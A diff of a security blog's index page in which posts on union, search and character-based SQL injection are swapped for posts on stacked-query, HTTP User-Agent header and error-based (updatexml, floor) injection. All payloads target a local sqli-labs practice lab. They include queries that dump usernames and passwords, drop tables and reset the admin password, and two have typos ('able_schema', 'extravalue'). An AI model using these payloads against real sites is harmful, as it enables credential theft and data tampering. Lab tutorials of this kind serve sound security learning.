@@ -811,7 +811,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/24/UnionSqlInjection/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/29/SQLInjectionMySQLStackBased/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -825,7 +825,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2016/10/24/UnionSqlInjection/" class="post-title-link" itemprop="url">Union Sql Injection Detection Methods</a>
+            <a href="/2016/11/29/SQLInjectionMySQLStackBased/" class="post-title-link" itemprop="url">MySQL Stack-Based SQL Injection</a>
         </h2>
 
         <div class="post-meta">
@@ -835,14 +835,14 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2016-10-24 19:11:44" itemprop="dateCreated datePublished" datetime="2016-10-24T19:11:44-04:00">2016-10-24</time>
+              <time title="Created: 2016-11-29 23:22:05" itemprop="dateCreated datePublished" datetime="2016-11-29T23:22:05-05:00">2016-11-29</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 19:46:14" itemprop="dateModified" datetime="2023-10-18T19:46:14-04:00">2023-10-18</time>
+                <time title="Modified: 2023-10-19 11:28:49" itemprop="dateModified" datetime="2023-10-19T11:28:49-04:00">2023-10-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -862,7 +862,7 @@
                 </span>
                   , 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Union Sql Injection</span></a>
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Stack-Based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Stack-Based SQL Injection</span></a>
                 </span>
             </span>
 
@@ -877,17 +877,104 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Union-Sql-Injection-Detection-Methods"><a href="#Union-Sql-Injection-Detection-Methods" class="headerlink" title="Union Sql Injection Detection Methods"></a>Union Sql Injection Detection Methods</h1><ol>
-<li>First, check for the existence of an SQL injection vulnerability.</li>
-<li>Then, determine the injection type: character-based, numeric-based, or search-based.</li>
-<li>Use “order by” to further identify the number of columns:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+ (normal)</span><br><span class="line">?id=1&#x27; order by 4 --+ (error)</span><br></pre></td></tr></table></figure></li>
-<li>Once the number of columns is determined using “order by,” proceed to replace the display position with some MySQL functions.</li>
-<li>Retrieve the tables in the current database:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, table_name), version() from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure></li>
-<li>After obtaining the tables, retrieve the columns in those tables:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;, column_name), version() from information_schema.columns where able_schema=database() and table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li>
-<li>Retrieve the data:<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;, username), group_concat(&#x27;|&#x27;, password) from users--+</span><br></pre></td></tr></table></figure>
-These steps describe how an attacker can detect and exploit a SQL injection vulnerability to extract information from a database.</li>
+          <p>In SQL, a semicolon represents the end of one SQL statement, while stack-based injection involves executing multiple SQL statements together. Stack-based injection is different from other injection techniques and has limitations.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%27 --- <span class="string">&#x27;</span></span><br><span class="line"><span class="string">%20 --- space</span></span><br></pre></td></tr></table></figure>
+
+<p>How can you find the table fields and table names of the other party?</p>
+<ol>
+<li>Look for exploitable files using directory traversal vulnerabilities, such as files with a .sql extension.</li>
+<li>Use directory&#x2F;file fuzzing tools like Dirsearch, etc., to search for .sql files.</li>
+<li>Search for source code leakage vulnerabilities on the other party’s website; the source code may contain exploitable files.</li>
+<li>Search for the other party’s website source code on GitHub.</li>
 </ol>
-<h1 id="Examples-of-Target-Machines"><a href="#Examples-of-Target-Machines" class="headerlink" title="Examples of Target Machines"></a>Examples of Target Machines</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version() --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,table_name) ,version() from information_schema.tables where table_schema=database()--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,group_concat(&#x27;<span class="tag">&lt;<span class="name">br</span>&gt;</span>&#x27;,column_name),version() from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, username,password from users --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1, group_concat(&#x27;|&#x27;,username),group_concat(&#x27;|&#x27;,password) from users --+</span><br></pre></td></tr></table></figure>
+<p>Example:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 1   </span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;   显示正常</span></span><br><span class="line"><span class="string">http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;</span>;create table aa like <span class="built_in">users</span>;    当前数据库中创建了一个与<span class="built_in">users</span>相同字段的表aa</span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;drop table aa--+</span></span><br><span class="line"><span class="string">http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;</span>;update <span class="built_in">users</span>  <span class="built_in">set</span> password =<span class="string">&#x27;admin@1234&#x27;</span> <span class="built_in">where</span> username=<span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/25/SQLInjectionHttpHeader/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/11/25/SQLInjectionHttpHeader/" class="post-title-link" itemprop="url">HTTP Header SQL Injection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-11-25 21:11:31" itemprop="dateCreated datePublished" datetime="2016-11-25T21:11:31-05:00">2016-11-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-19 11:20:17" itemprop="dateModified" datetime="2023-10-19T11:20:17-04:00">2023-10-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">HTTP Header SQL Injection</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p> HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. This can have various security implications, including the potential for cross-site scripting (XSS) attacks or other forms of web application exploitation.</p>
+<p> Example :<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli-labs-master/Less-18/ HTTP/1.1</span><br><span class="line">Host: 192.168.1.33</span><br><span class="line">Content-Length: 38</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.1.33</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent:1<span class="string">&#x27; and updatexml(1,concat(0x7e,(user()),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.1.33/sqli-labs-master/Less-18/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=admin&amp;passwd=admin&amp;submit=Submit   </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -907,7 +994,7 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/23/Search-BasedSqlInjection/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/22/SQLInjectionMySQLError/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -921,7 +1008,7 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2016/10/23/Search-BasedSqlInjection/" class="post-title-link" itemprop="url">Search-Based SQL Injection Detection</a>
+            <a href="/2016/11/22/SQLInjectionMySQLError/" class="post-title-link" itemprop="url">MySQL Error-Based SQL Injection</a>
         </h2>
 
         <div class="post-meta">
@@ -931,14 +1018,14 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2016-10-23 19:57:41" itemprop="dateCreated datePublished" datetime="2016-10-23T19:57:41-04:00">2016-10-23</time>
+              <time title="Created: 2016-11-22 20:55:15" itemprop="dateCreated datePublished" datetime="2016-11-22T20:55:15-05:00">2016-11-22</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 18:54:24" itemprop="dateModified" datetime="2023-10-18T18:54:24-04:00">2023-10-18</time>
+                <time title="Modified: 2023-10-19 11:20:20" itemprop="dateModified" datetime="2023-10-19T11:20:20-04:00">2023-10-19</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -958,7 +1045,7 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
                 </span>
                   , 
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Search-Based SQL Injection</span></a>
+                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">MySQL Error-Based SQL Injection</span></a>
                 </span>
             </span>
 
@@ -973,111 +1060,35 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="Search-Based-Injection-Detection-Methods"><a href="#Search-Based-Injection-Detection-Methods" class="headerlink" title="Search-Based Injection Detection Methods:"></a>Search-Based Injection Detection Methods:</h1><ol>
-<li><p>Input the search keyword: </p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>  If an error occurs, there’s a high probability of a vulnerability.</p>
-</li>
-<li><p>Input the search keyword: </p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>  If an error occurs, there’s a high probability of a vulnerability.</p>
-</li>
-<li><p>Input the search keyword: </p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span> <span class="string">&#x27;and 1=1 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>  Observe the response.</p>
-</li>
-<li><p>Input the search keyword: </p>
-  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keyword<span class="operator">%</span> <span class="string">&#x27;and 1=2 and &#x27;</span><span class="operator">%</span><span class="string">&#x27;=&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>  Observe the response.</p>
-</li>
+          <ol>
+<li>Overview</li>
 </ol>
-<h1 id="Search-Based-Injection-Detection-Statements"><a href="#Search-Based-Injection-Detection-Statements" class="headerlink" title="Search-Based Injection Detection Statements:"></a>Search-Based Injection Detection Statements:</h1>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=1--&#x27;</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27; </span><br></pre></td></tr></table></figure>
-      
-    </div>
+<p>Error-Based Injection involves deliberately triggering error conditions in the database to make query results appear in error messages. This technique is particularly useful in cases where UNION-based injections are restricted and error information can be returned. It’s also known as Formulaic SQL Injection.</p>
+<ol start="2">
+<li>Utilizing the updatexml() function:</li>
+</ol>
+<p>Payload:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1));--+</span><br></pre></td></tr></table></figure>
+<p><code>0x7e</code>: ~<br><code>updatexml()</code>: Function used to update XML documents.<br><code>updatexml()</code> syntax: update(target_xml_document, xpath_expression, new_value)<br>XPath expressions are used to specify paths within an XML document. If the format is incorrect, an error will occur.</p>
+<p>Subsequent steps for updatexml-based error-based injection:</p>
+<p>(1). Modify the SQL statement for selecting the user position.<br>(2). Retrieve tables in the current database.<br>(3). Retrieve columns of a specific table.<br>(4). Continue step by step.</p>
+<ol start="3">
+<li>Utilizing the extravalue() function:</li>
+</ol>
+<p>Payload:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extravalue(1,concat(0x7e,(select user()),0x7e)))--+</span><br></pre></td></tr></table></figure>
+<p><code>extravalue()</code> function is similar to updatexml() and is used for querying node content in an XML document.<br>Subsequent steps for extravalue-based error-based injection are the same as for updatexml.</p>
+<ol start="4">
+<li>Utilizing the floor() function:</li>
+</ol>
+<p>Payload:</p>
+<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure>
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/20/characterSqlInject/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="Python、Typescript、Go、C/C++、asm、Bash">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/10/20/characterSqlInject/" class="post-title-link" itemprop="url">Character-based SQL Injection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2016-10-20 21:55:22" itemprop="dateCreated datePublished" datetime="2016-10-20T21:55:22-04:00">2016-10-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 18:55:32" itemprop="dateModified" datetime="2023-10-18T18:55:32-04:00">2023-10-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">Character-based SQL Injection</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Detection of character-based SQL Injection:</p>
-<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27;</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>
+<p>The principle utilized is the repetition of primary keys due to the repetitiveness of <code>floor(rand(0)*2)</code>, leading to an error in the group by statement.<br>The group by key principle involves looping through every row of data and saving the results in a temporary table. When reading each row’s key, if the key exists in the temporary table, it won’t update the temporary table’s data. If the key doesn’t exist, it will insert the key’s row data into the temporary table.</p>
+<ol start="5">
+<li>Additional Information:</li>
+</ol>
+<p>These three functions are commonly used in error-based injections.</p>
 
       
     </div>
@@ -1164,13 +1175,13 @@ These steps describe how an attacker can detect and exploit a SQL injection vuln
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-count">27</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">36</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
